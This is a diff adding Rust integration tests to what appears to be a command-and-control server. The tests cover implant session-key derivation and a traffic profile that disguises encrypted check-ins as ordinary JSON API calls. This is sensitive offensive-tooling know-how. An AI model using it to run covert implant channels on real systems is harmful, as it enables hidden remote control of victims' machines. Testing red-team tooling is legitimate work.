@@ -11,6 +11,9 @@ use specter_common::proto::specter::v1::TaskPriority;
 use specter_server::db;
 use specter_server::event::EventBus;
 use specter_server::listener::{build_router, HttpState};
+use specter_server::profile::{
+    compile_listener_config, parse_profile, transform_decode, transform_encode,
+};
 use specter_server::session::SessionManager;
 use specter_server::task::TaskDispatcher;
 
@@ -40,6 +43,67 @@ async fn setup() -> (Arc<SessionManager>, Arc<TaskDispatcher>, axum::Router) {
 
 fn checkin_request_body(req: &CheckinRequest) -> Body {
     Body::from(serde_json::to_vec(req).unwrap())
+}
+
+fn derive_profile_session_key(server_secret: &StaticSecret, implant_pubkey: &[u8; 32]) -> [u8; 32] {
+    use hmac::{Hmac, Mac};
+    use sha2::Sha256;
+
+    type HmacSha256 = Hmac<Sha256>;
+
+    let implant_pub = PublicKey::from(*implant_pubkey);
+    let shared = server_secret.diffie_hellman(&implant_pub);
+
+    let mut mac =
+        <HmacSha256 as Mac>::new_from_slice(implant_pubkey).expect("HMAC key length is valid");
+    mac.update(shared.as_bytes());
+    let prk = mac.finalize().into_bytes();
+
+    let mut mac2 = <HmacSha256 as Mac>::new_from_slice(&prk).expect("HMAC key length is valid");
+    mac2.update(b"specter-session");
+    mac2.update(&[0x01]);
+    let okm = mac2.finalize().into_bytes();
+
+    let mut key = [0u8; 32];
+    key.copy_from_slice(&okm[..32]);
+    key
+}
+
+fn profile_test_yaml() -> &'static str {
+    r#"
+name: profile-router-test
+http:
+  request:
+    method: POST
+    uri_patterns:
+      - /api/v1/status
+    headers:
+      - name: Content-Type
+        value: application/json
+    data_embed_points:
+      - location: json_field
+        field_name: trace
+        encoding: raw
+  response:
+    status_code: 200
+    headers:
+      - name: Content-Type
+        value: application/json
+    body_template: '{"trace":"{{data}}"}'
+    data_embed_points:
+      - location: json_field
+        field_name: trace
+        encoding: raw
+timing:
+  callback_interval: 60
+  jitter_percent: 0
+tls:
+  verify: false
+transform:
+  compress: none
+  encrypt: chacha20-poly1305
+  encode: base64
+"#
 }
 
 #[tokio::test]
@@ -121,6 +185,90 @@ async fn checkin_accepts_valid_json_and_returns_pending_tasks() {
     let sessions = session_mgr.list_sessions().await.unwrap();
     assert_eq!(sessions.len(), 1);
     assert_eq!(sessions[0].hostname, "VICTIM01");
+}
+
+#[tokio::test]
+async fn profile_route_decodes_with_registered_session_pubkey_without_static_lab_key() {
+    let pool = db::init_db(":memory:").await.unwrap();
+    let bus = Arc::new(EventBus::new(64));
+    let session_mgr = Arc::new(SessionManager::new(pool.clone(), bus.clone()));
+    let task_disp = Arc::new(TaskDispatcher::new(pool.clone(), bus.clone()));
+
+    let server_secret = StaticSecret::random_from_rng(rand::thread_rng());
+    let server_pubkey = PublicKey::from(&server_secret);
+    let implant_secret = StaticSecret::random_from_rng(rand::thread_rng());
+    let implant_pubkey = PublicKey::from(&implant_secret).to_bytes();
+    let session_key = derive_profile_session_key(&server_secret, &implant_pubkey);
+
+    let session_id = session_mgr
+        .register_session_with_pubkey(
+            "PROFILE-HOST".into(),
+            "tester".into(),
+            7777,
+            "Windows".into(),
+            "Medium".into(),
+            "specter.exe".into(),
+            "10.0.0.7".into(),
+            "203.0.113.7".into(),
+            Some(implant_pubkey.to_vec()),
+        )
+        .await
+        .unwrap();
+
+    let profile = parse_profile(profile_test_yaml()).unwrap();
+    let listener_profile = compile_listener_config(&profile);
+    let state = HttpState {
+        session_manager: session_mgr.clone(),
+        task_dispatcher: task_disp,
+        event_bus: bus,
+        module_repository: None,
+        server_secret: Arc::new(server_secret),
+        server_pubkey: Arc::new(server_pubkey),
+        listener_profile: Some(Arc::new(listener_profile)),
+        profile_session_key: None,
+        pool: pool.clone(),
+    };
+    let app = build_router(state);
+
+    let checkin = CheckinRequest {
+        session_id: Some(session_id.clone()),
+        hostname: "PROFILE-HOST".into(),
+        username: "tester".into(),
+        pid: 7777,
+        os_version: "Windows".into(),
+        integrity_level: "Medium".into(),
+        process_name: "specter.exe".into(),
+        internal_ip: "10.0.0.7".into(),
+        external_ip: "203.0.113.7".into(),
+        task_results: vec![],
+    };
+    let encoded = transform_encode(
+        &serde_json::to_vec(&checkin).unwrap(),
+        &profile.transform,
+        &session_key,
+    )
+    .unwrap();
+    let body = serde_json::json!({ "trace": String::from_utf8(encoded).unwrap() });
+
+    let resp = app
+        .oneshot(
+            Request::builder()
+                .method("POST")
+                .uri("/api/v1/status")
+                .header("content-type", "application/json")
+                .body(Body::from(serde_json::to_vec(&body).unwrap()))
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+
+    assert_eq!(resp.status(), 200);
+    let body = resp.into_body().collect().await.unwrap().to_bytes();
+    let response_json: serde_json::Value = serde_json::from_slice(&body).unwrap();
+    let encoded_response = response_json["trace"].as_str().unwrap().as_bytes();
+    let plaintext = transform_decode(encoded_response, &profile.transform, &session_key).unwrap();
+    let checkin_response: CheckinResponse = serde_json::from_slice(&plaintext).unwrap();
+    assert_eq!(checkin_response.session_id, session_id);
 }
 
 #[tokio::test]
